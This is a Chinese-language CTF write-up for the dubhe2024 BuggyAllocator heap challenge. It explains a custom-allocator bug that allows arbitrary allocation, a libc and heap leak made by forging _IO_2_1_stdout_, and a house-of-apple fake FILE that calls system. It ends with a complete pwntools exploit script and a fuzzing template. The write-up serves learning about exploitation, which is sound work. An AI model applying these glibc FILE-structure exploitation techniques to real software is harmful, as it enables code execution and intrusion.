在堆题中遇到没有show()函数的情况，导致无法泄露地址。这时可以通过修改_IO_2_1_stdout_来强制程序输出一段内存，从而泄露需要的地址。

例题：[dubhe2024 BuggyAllocator](https://files.cnblogs.com/files/blogs/709433/BuggyAllocator.7z?t=1711594448&download=true "dubhe2024 BuggyAllocator")

dubhe2024，xctf分站赛最后一场凄惨爆零，主看了这道题一整天，逆清楚了但找不到漏洞。~~事后来看当时就算找到洞了也不会这种泄露手法。~~

简单逆一下程序，结构体整理好，可以发现就是一般菜单题，但当size<=0x80，即fastsize时会使用自己写的堆管理器来管理。管理方式：一个个纯粹的单链表构成类fastbin结构，当该size的fastbin不足时会尝试往该fastbin中塞20个。首先尝试从预先malloc出来的topchunk到extopchunk这段空间中取20*size的空间，拿出来返回回去并往fastbin中塞19个；若取不到20个那么少取一些也行；若topchunk到extopchunk的空间连一个size都取不出来，则先将extopchunk到topchunk这段空间放入fastbin防止内存泄漏，随后先调整topchunk再进行分配。首先找比当前size大的fastbin，若存在，则取出该fastbin并将该chunk的头尾设为topchunk和extopchunk，再返回第一步尝试分配；若没有比当前chunk大的fastbin，就考虑malloc(40*size)作为topchunk和extopchunk，再返回第一步尝试分配。

程序漏洞在于fastbin没有对单链表结束的判断，也没有链表长度统计。所以当程序尝试往fastbin中填充20个chunk时，如果第20个chunk的fd处本来就有数据，那么链表就会被错误地延长。因此，先malloc一个大chunk，在第20个chunk的fd处写入特定的数据，即可实现任意地址分配堆块，实现任意写。

本文主要地址泄露手法主要参考了[这篇文章](https://blog.csdn.net/qq_41202237/article/details/113845320 "这篇文章")。
首先看一下IO_file的结构
```
0x0:'_flags',
0x8:'_IO_read_ptr',
0x10:'_IO_read_end',
0x18:'_IO_read_base',
0x20:'_IO_write_base',
0x28:'_IO_write_ptr',
0x30:'_IO_write_end',
0x38:'_IO_buf_base',
0x40:'_IO_buf_end',
0x48:'_IO_save_base',
0x50:'_IO_backup_base',
0x58:'_IO_save_end',
0x60:'_markers',
0x68:'_chain',
0x70:'_fileno',
0x74:'_flags2',
0x78:'_old_offset',
0x80:'_cur_column',
0x82:'_vtable_offset',
0x83:'_shortbuf',
0x88:'_lock',
0x90:'_offset',
0x98:'_codecvt',
0xa0:'_wide_data',
0xa8:'_freeres_list',
0xb0:'_freeres_buf',
0xb8:'__pad5',
0xc0:'_mode',
0xc4:'_unused2',
0xd8:'vtable'
```
通过gdb单步调试了解到，puts("ABCDEFGH")函数大致可以分为两步：
1.将"ABCDEFGH"一个个写到_IO_write_base和_IO_write_ptr申请的堆地址上，_IO_write_base和_IO_write_p分别指向buf的头和尾。
2.调用sys_write(1,_IO_write_base,_IO_write_ptr-_IO_write_base)
在这些过程中，_flags位用于指挥程序运行流程。看下来并没有什么神秘的部分~~，感觉一系列操作都挺多余的，也不知道为什么libc要这么封装（~~。
阅读上面那篇博客，我们可以得知：
1.设置_flags为0xfbad1800
2.设置_IO_write_base为泄露起始地址
3.设置_IO_write_ptr为泄露结束地址
随后再任意调用一下puts函数，即可完成泄露。

好了理论讲完了，回到题目看看，发现全程用的都是cout<<没有puts()，OvO。嘛不管了差不多的啦，cout<<肯定封装的更多所以应该会有效的吧。。
把堆块分配到stdout上，什么也别干啥也别动，再申请一个就能申请到_IO_2_1_stdout_了，这样修改：
```
fake_stdout = p64(0xfbad1800) + p64(0)
fake_stdout+= p64(0) + p64(0)
fake_stdout+= p64(0x4045d0) + p64(0x4046d0)
```
不用自作聪明把其他的什么_IO_read_ptr或者_IO_buf_base改到同一个什么可写地址，这样好像会让cout<<出错然后自己exit()。前面写0后面不管就可以了，程序做完一次cout就自动变回去了。
![image](https://img2024.cnblogs.com/blog/2567452/202403/2567452-20240328162330796-2054394100.png)
专门挑了个方便点的地方把libc和heap都搞出来，然后就泄露好了。

再就是打house of apple就行了。避免麻烦直接用system了，发现直接system("/bin/sh")或者system("sh")会导致进不去system，毕竟写"/bin/sh"的那里是_flags，不过前面加个空格就好了，但system(" sh")拿到的shell不知道为啥没法交互。最终system(" cat flag")拿了flag，还是没拿到shell。学了个py好看的语法糖：
```
IO_file = flat({
0x0: b"  sh",
0x28: b"\1",
0x68: p64(system),
0xa0: p64(fake_addr), # wide data
0xD8: p64(_IO_wfile_jumps), # vtable
0xe0: p64(fake_addr)
}, filler=b"\0")
```
伪造的IO_file完全可以申请一个大chunk放进去，不知道V&N战队为啥还把IO_file拆开到两个chunk里去，可能是做题到最后头晕忘了吧。
最后的最后，懒得搞堆风水了，把原来申请在_IO_2_1_stdout_的chunk释放了再申请回来，把_IO_2_1_stdout_的_chain改到伪造的IO_file处。最后随便输点啥退出即可，题目没有为难俺们。

此外这次比赛期间还试了一下fuzz，虽然没fuzz出洞来，但也算是初尝试了吧，这里记一些python语法和模板：
```
allocated = []
unallocat = [i for i in range(64)]
def fuzz(T):
    f = open("log.txt","w")
    for i in range(0,T):
        if((randint(0,1) or len(allocated)<2) and len(unallocat)>1):
            idxidx = randint(0, len(unallocat)-1)
            idx = unallocat[idxidx]
            allocated.append(idx)
            unallocat.pop(idxidx)
            siz = 0xa0*randint(1,0x20)
            f.write("add({},".format(idx) + "{})\n".format(siz))
            add(idx,siz,b"AAAAAAAA")
        else:
            idxidx = randint(0,len(allocated)-1)
            idx = allocated[idxidx]
            unallocat.append(idx)
            allocated.pop(idxidx)
            f.write("fre({})\n".format(idx))
            fre(idx)

try:
    fuzz(0x8000)
except EOFError:
    print("gg!")
```
exp：
```
from pwn import*
from struct import pack

p = process("./pwn")
libc = ELF("./libc.so.6")

def add(idx,siz,cot):
    p.sendlineafter("> ","1")
    p.sendlineafter(": ",str(idx))
    p.sendlineafter(": ",str(siz))
    p.sendafter(": ",cot)

def fre(idx):
    p.sendlineafter("> ","2")
    p.sendlineafter(": ",str(idx))

def exi():
    p.sendlineafter("> ","sb,you've been hacked!")

bss_H = 0x404900
stdout = 0x404040
payload = b'A'*(19*0x80) + p64(stdout)
add(0,0x2000,payload)
fre(0)
for i in range(20):
    add(i,0x80,"BBBBBBBB")

add(20,0x80,"\x80")
fake_stdout = p64(0xfbad1800) + p64(0)
fake_stdout+= p64(0) + p64(0)
fake_stdout+= p64(0x4045d0) + p64(0x4046d0)

add(21,0x80,fake_stdout)
p.recv(8)
heap_base = u64(p.recv(8))
p.recv(0x18)
_IO_2_1_stdout_ = u64(p.recv(8))
libc_base = _IO_2_1_stdout_ - libc.symbols["_IO_2_1_stdout_"]
print(hex(libc_base))
print(hex(heap_base))
system = libc_base + libc.symbols["system"]
_IO_wfile_jumps = libc_base + libc.symbols["_IO_wfile_jumps"]
fake_addr = heap_base + 0xa90
IO_file = flat({
0x0: b"  sh",
0x28: b"\1",
0x68: p64(system),
0xa0: p64(fake_addr), # wide data
0xD8: p64(_IO_wfile_jumps), # vtable
0xe0: p64(fake_addr)
}, filler=b"\0")
add(22,0x100,IO_file)

fre(21)
fake_stdout = p64(0xfbad1800) + p64(_IO_2_1_stdout_+131)
fake_stdout+= p64(_IO_2_1_stdout_+131) + p64(_IO_2_1_stdout_+131)
fake_stdout+= p64(_IO_2_1_stdout_+131) + p64(_IO_2_1_stdout_+131)
fake_stdout+= p64(_IO_2_1_stdout_+132) + p64(_IO_2_1_stdout_+131)
fake_stdout+= p64(_IO_2_1_stdout_+132) + p64(0)
fake_stdout+= p64(0) + p64(0)
fake_stdout+= p64(0) + p64(fake_addr)
add(21,0x80,fake_stdout)
exi()
p.interactive()
```
